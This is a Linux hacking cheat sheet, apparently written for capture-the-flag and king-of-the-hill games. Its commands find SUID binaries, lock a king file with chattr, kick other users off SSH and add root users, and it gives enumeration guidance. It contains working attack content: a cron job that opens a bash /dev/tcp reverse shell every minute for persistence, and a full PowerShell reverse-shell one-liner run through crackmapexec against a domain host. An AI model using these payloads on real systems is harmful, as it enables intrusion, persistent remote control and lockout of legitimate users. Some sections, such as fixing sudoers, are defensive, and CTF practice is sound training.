# Hacking linux Cheat sheet
Hacking linux 



- [one tricks/others](#one-tricksothers)
  - [looking for root permissions](#looking-for-root-permissions)
  - [using chattr](#using-chattr)
  - [fixing the vulnerability in /etc/sudoers, for example](#fixing-the-vulnerability-in-etcsudoers-for-example)
  - [finding flags](#finding-flags)
  - [full tty shell](#full-tty-shell)
  - [protecting your king using while](#protecting-your-king-using-while)
  - [how to see who is logged into the system](#how-to-see-who-is-logged-into-the-system)
  - [killing session of a user logged into ssh/system](#killing-session-of-a-user-logged-into-sshsystem)
  - [changing ssh user password](#changing-ssh-user-password)
  - [defending box](#defending-box)
  - [python http server](#python-http-server)
  - [python smb server](#python-smb-server)
  - [adding users with root privileges](#adding-users-with-root-privileges)
  - [Remove user from sudoers](#Remove-user-from-sudoers)
  - [using crontab to load a script with a reverse shell every 1 minute](#using-crontab-to-load-a-script-with-a-reverse-shell-every-1-minute)
  - [one liner bangers](#one-liner-bangers)
  - [check running services](#check-running-services)
  - [upgrade normal shell in metasploit to a meterpreter shell](#upgrade-normal-shell-in-metasploit-to-a-meterpreter-shell)
---------------------------------------------------------------------------------------------------------------------------------------------------------
- [basic local machine enumeration](#basic-local-machine-enumeration)
  - [System](#System)
  - [Users](#Users)
  - [Networking](#Networking)
  - [Running Services](#Running-Services)
  - [DNS](#DNS)
  - [SMB](#SMB)
  - [SNMP](#SNMP)
-------------------------------------------------------------------------------------------------------------------------------------------------------
- [Linux Privilige Escalation](#Linux-Privilige-Escalation)

  
-------------------------------------------------------------------------------------------------------------------------------------------------------
  
  # one tricks/others

### looking for root permissions

* you can use find to search for permissions with root

```
find / -type f \( -perm -4000 -o -perm -2000 \) -print
```
* Find SUID privescs using the following commands:
```
find / -perm -u=s -type f 2>/dev/null
```

* Find SGID privescs using the following commands:
```
find / -perm -g=s -type f 2>/dev/null
```



### using chattr

* you can use this to make the file immutable and therefore keep your name in this file.
* if the box dont have chattr you can simply install chattr or download chattr binary or busybox binary 

Add the immutability bit:
```
chattr +i /root/king.txt
```

Remove the immutability bit:
```
chattr -i /root/king.txt
```

Remove chattr:
```
which chattr # Get chattr's path, default: /usr/bin/chattr
```

```
rm usr/bin/chattr # Or another path if different
```



### fixing the vulnerability in /etc/sudoers, for example

```
# User privilege specification
root ALL=(ALL=ALL) ALL
teste ALL=(root) SETENV:NOPASSWD: /usr/bin/git *, /usr/bin/chattr
test1 ALL=(root) NOPASSWD: /bin/su test1, /usr/bin/chattr
```

* here you can see that user teste and teste1 has root permission on the git and su binary, to fix this just remove everything from the teste and teste1 there

```
root ALL=(ALL=ALL) ALL
```

* and it will be like that, so there will be no way to climb privilege by su and git

### finding flags

## using find

* you can use find to look for flags

```
find / -name flag.txt 2>/dev/null
find / -name user.txt 2>/dev/null
find / -name .flag 2>/dev/null
find / -name flag 2>/dev/null
find / -name root.txt 2>/dev/null
```

## using grep

ops this one is for when the directory you are in at the momoent
```
grep -ri thm{ 2>/dev/null
```

### full tty shell

* tweaking your shell, if you get a reverse shell and you ctrl + c and your shell closes/stops, this will help you and you can edit, give ctrl + c at will

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
export TERM=xterm
Ctrl + z
stty raw -echo;fg
```
* for you to know which pts (pseudo slave terminal) the user is connected, just use the following command in the terminal: w , then just see which pts the user is and use the command

* extra: this works sometimes too 

```
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
Ctrl + z
stty raw -echo;fg
```

## protecting your king using while
this one is using chattr too to protect the file 
```
while true; do echo "suljov" > /root/king.txt; chattr +ia king.txt; set -O noclobber king.txt; done &
```


## how to see who is logged into the system

* you can use the following commands to see who is logged into ssh/system

```
w
who
ps aux | grep pts
```

## killing session of a user logged into ssh/system

* to kill someone's session just use the following command
manual:
```
pkill -9 -t pts/1
```
## kicking all users connected in ssh
```
kill `ps aux|grep pts| awk '{print $2}'`;
```

## kicking all people connected to a given user on ssh 
```
pkill -9 -U <name> 
```


* as explained in some examples above, just put the pts of the user you want to remove from the machine

### changing ssh user password

* to change a user's password just use the following command

```
passwd [UserName]
```

* you can change ssh keys



### defending box

* Look for common ways to fix a box, for example: changing ssh keys, changing passwords, look for running processes or even in cronjobs

* Always set your persistence so that even if someone kicks you out, you have multiple ways to get back.

* So start fixing things in the box. Fix security issues, not legitimate services. For example, disabling ssh is NOT allowed unless it is an intentionally broken ssh installation.

## python http server

```
python3 -m http.server <port>
```

## python smb server
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

## adding users with root privileges

first
```
adduser <name> 
```
then edit the /etc/sudoers with this 
```
<user> ALL=(ALL:ALL) ALL
```



 
## Remove user from sudoers
```
nano /etc/sudoers
```

or alternative
```
visudo
```

## using crontab to load a script with a reverse shell every 1 minute
first
```
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" > .persistence.sh
```
then
```
chmod +x .persistence.sh
```
after that you go in to vim
```
vim /etc/crontab
```
and add this 
```
* * * * * root /dev/shm/.persistence.sh
```
save and quit then you can connect with a reverse shell every 1 minute with nc like 
```
nc -lvnp <PORT> 
```

## one liner bangers


```
sudo crackmapexec smb --exec-method atexec -d INLANEFREIGHT.LOCAL -u xxxxx-p xxxxx -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""172.16.5.225""""; $port=""""4444"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};' 172.16.5.5
```
## check running services
```
netstat 
```
```
netstat -tulwn
```

### upgrade normal shell in metasploit to a meterpreter shell

if you can get a shell but for some reason cant get the meterpreter shell to work do this.

get a shell with just a generic shell on metasploit when use this: 
```
use multi/manage/shell_to_meterpreter
```

then update the opstions and then write:
```
run
```
  
---------------------------------------------------------------------------------------------------------------------------------------------------------
  
### basic local machine enumeration
This task focuses on enumerating a Linux machine after accessing a shell, such as bash. Although some commands provide information on more than one area, we tried to group the commands into four categories depending on the information we expect to acquire.

*    System
*    Users
*    Networking
*    Running Services
  
### system 
On a Linux system, we can get more information about the Linux distribution and release version by searching for files or links that end with -release in /etc/. Running ls /etc/*-release helps us find such files. Let’s see what things look like on a CentOS Linux.

![image](https://user-images.githubusercontent.com/24814781/187430324-3771f669-0e61-49a5-b43d-fd8776befccc.png)

We can find the system’s name using the command hostname.

![image](https://user-images.githubusercontent.com/24814781/187430810-24cc152b-6aed-49f9-b663-c7e372c856b8.png)

Various files on a system can provide plenty of useful information. In particular, consider the following /etc/passwd, /etc/group, and /etc/shadow. Any user can read the files passwd and group. However, the shadow password file requires root privileges as it contains the hashed passwords. If you manage to break the hashes, you will know the user’s original password.

![image](https://user-images.githubusercontent.com/24814781/187430923-40f0d174-9c38-4ca2-b37a-bcda8645353b.png)

Similarly, various directories can reveal information about users and might contain sensitive files; one is the mail directories found at /var/mail/.

![image](https://user-images.githubusercontent.com/24814781/187431071-745c19f6-a9e5-4ee2-9c48-8cbd2639cdc0.png)

To find the installed applications you can consider listing the files in /usr/bin/ and /sbin/:

*    ls -lh /usr/bin/
*    ls -lh /sbin/

On an RPM-based Linux system, you can get a list of all installed packages using rpm -qa. The -qa indicates that we want to query all packages.

On a Debian-based Linux system, you can get the list of installed packages using dpkg -l. The output below is obtained from an Ubuntu server.


![image](https://user-images.githubusercontent.com/24814781/187431240-923551b1-24cb-4867-b3c5-3d06a92e76a4.png)


### users
Files such as /etc/passwd reveal the usernames; however, various commands can provide more information and insights about other users on the system and their whereabouts.

You can show who is logged in using who.

![image](https://user-images.githubusercontent.com/24814781/187431344-bc079502-51b9-40af-a4cb-1aed0d249281.png)

We can see that the user root is logged in to the system directly, while the users jane and peter are connected over the network, and we can see their IP addresses.

Note that who should not be confused with whoami which prints your effective user id.

![image](https://user-images.githubusercontent.com/24814781/187431543-09223d3b-b54f-428f-b118-bf2f61725532.png)

To take things to the next level, you can use w, which shows who is logged in and what they are doing. Based on the terminal output below, peter is editing notes.txt and jane is the one running w in this example.

![image](https://user-images.githubusercontent.com/24814781/187431613-fca51f41-3194-4eeb-aad3-726ff0b2490c.png)

To print the real and effective user and group IDS, you can issue the command id (for ID).

![image](https://user-images.githubusercontent.com/24814781/187431912-1c995d33-c33a-4002-ac1c-5e9a9015ff4d.png)


Do you want to know who has been using the system recently? last displays a listing of the last logged-in users; moreover, we can see who logged out and how much they stayed connected. In the output below, the user randa remained logged in for almost 17 hours, while the user michael logged out after four minutes.

![image](https://user-images.githubusercontent.com/24814781/187432000-dbb3079a-5b24-4961-8dee-8d689432061e.png)

Finally, it is worth mentioning that sudo -l lists the allowed command for the invoking user on the current system.


###  Networking

The IP addresses can be shown using ip address show (which can be shortened to ip a s) or with the older command ifconfig -a (its package is no longer maintained.) The terminal output below shows the network interface ens33 with the IP address 10.20.30.129 and subnet mask 255.255.255.0 as it is 24.

![image](https://user-images.githubusercontent.com/24814781/187432077-abd059db-566d-4368-908f-1fb6b20b0140.png)

The DNS servers can be found in the /etc/resolv.conf. Consider the following terminal output for a system that uses DHCP for its network configurations. The DNS, i.e. nameserver, is set to 10.20.30.2.

![image](https://user-images.githubusercontent.com/24814781/187432232-49bf1d26-556d-441a-8202-6a9646719779.png)

netstat is a useful command for learning about network connections, routing tables, and interface statistics. We explain some of its many options in the table below.

![image](https://user-images.githubusercontent.com/24814781/187432343-cd448868-41fb-40bf-bf92-e6385576d0ea.png)

You can use any combination that suits your needs. For instance, netstat -plt will return Programs Listening on TCP sockets. As we can see in the terminal output below, sshd is listening on the SSH port, while master is listening on the SMTP port on both IPv4 and IPv6 addresses. Note that to get all PID (process ID) and program names, you need to run netstat as root or use sudo netstat.

![image](https://user-images.githubusercontent.com/24814781/187432440-ba17a00e-9514-45de-b959-c813b40c92b9.png)

netstat -atupn will show All TCP and UDP listening and established connections and the program names with addresses and ports in numeric format.

![image](https://user-images.githubusercontent.com/24814781/187432774-1968524a-8758-47db-9233-4725ce005135.png)

One might think that using nmap before gaining access to the target machine would have provided a comparable result. However, this is not entirely true. Nmap needs to generate a relatively large number of packets to check for open ports, which can trigger intrusion detection and prevention systems. Furthermore, firewalls across the route can drop certain packets and hinder the scan, resulting in incomplete Nmap results.

lsof stands for List Open Files. If we want to display only Internet and network connections, we can use lsof -i. The terminal output below shows IPv4 and IPv6 listening services and ongoing connections. The user peter is connected to the server rpm-red-enum.thm on the ssh port. Note that to get the complete list of matching programs, you need to run lsof as root or use sudo lsof.

![image](https://user-images.githubusercontent.com/24814781/187433028-e1a2c1a5-32a2-4314-bc08-65dd36b8cc61.png)

Because the list can get quite lengthy, you can further filter the output by specifying the ports you are interested in, such as SMTP port 25. By running lsof -i :25, we limit the output to those related to port 25, as shown in the terminal output below. The server is listening on port 25 on both IPv4 and IPv6 addresses.

![image](https://user-images.githubusercontent.com/24814781/187433134-1ddd5430-3c04-46b1-ae77-6fd923569def.png)

### Running Services
Getting a snapshot of the running processes can provide many insights. ps lets you discover the running processes and plenty of information about them.

You can list every process on the system using ps -e, where -e selects all processes. For more information about the process, you can add -f for full-format and-l for long format. Experiment with ps -e, ps -ef, and ps -el.

You can get comparable output and see all the processes using BSD syntax: ps ax or ps aux. Note that a and x are necessary when using BSD syntax as they lift the “only yourself” and “must have a tty” restrictions; in other words, it becomes possible to display all processes. The u is for details about the user that has the process.

![image](https://user-images.githubusercontent.com/24814781/187433222-85c5f931-2d0f-43ef-9aa3-6a594637fe78.png)

For more “visual” output, you can issue ps axjf to print a process tree. The f stands for “forest”, and it creates an ASCII art process hierarchy as shown in the terminal output below.

![image](https://user-images.githubusercontent.com/24814781/187433539-4c7da5e2-b29d-48f8-a276-195ec5867fab.png)

To summarize, remember to use ps -ef or ps aux to get a list of all the running processes. Consider piping the output via grep to display output lines with certain words. The terminal output below shows the lines with peter in them.

![image](https://user-images.githubusercontent.com/24814781/187433650-89563cb8-60c8-4cf0-b823-cdaf5fff0491.png)


### DNS
We are all familiar with Domain Name System (DNS) queries where we can look up A, AAAA, CName, and TXT records, among others.
If we can get a “copy” of all the records that a DNS server is responsible for answering, we might discover hosts we didn’t know existed.

One easy way to try DNS zone transfer is via the dig command.

Depending on the DNS server configuration, DNS zone transfer might be restricted. If it is not restricted, it should be achievable using 
```
dig -t AXFR DOMAIN_NAME @DNS_SERVER
```
The -t AXFR indicates that we are requesting a zone transfer, while @ precedes the DNS_SERVER that we want to query regarding the records related to the specified DOMAIN_NAME.


### SMB

Server Message Block (SMB) is a communication protocol that provides shared access to files and printers. We can check shared folders using net share. Here is an example of the output. We can see that C:\Internal Files is shared under the name Internal.

![image](https://user-images.githubusercontent.com/24814781/187435886-2cf6ba25-0b84-4b41-8666-cea49a0e246c.png)


### SNMP

Simple Network Management Protocol (SNMP) was designed to help collect information about different devices on the network. It lets you know about various network events, from a server with a faulty disk to a printer out of ink. Consequently, SNMP can hold a trove of information for the attacker. One simple tool to query servers related to SNMP is snmpcheck. You can find it on the AttackBox at the /opt/snmpcheck/ directory; the syntax is quite simple: /opt/snmpcheck/snmpcheck.rb 10.10.215.169 -c COMMUNITY_STRING.
If you would like to install snmpcheck on your local Linux box, consider the following commands. 

![image](https://user-images.githubusercontent.com/24814781/187435981-6446e39a-c9b5-4810-8989-e6f16d3cc9f8.png)

--------------------------------------------------------------------------------------------------------------------------------------------------------

# Linux Privilige Escalation



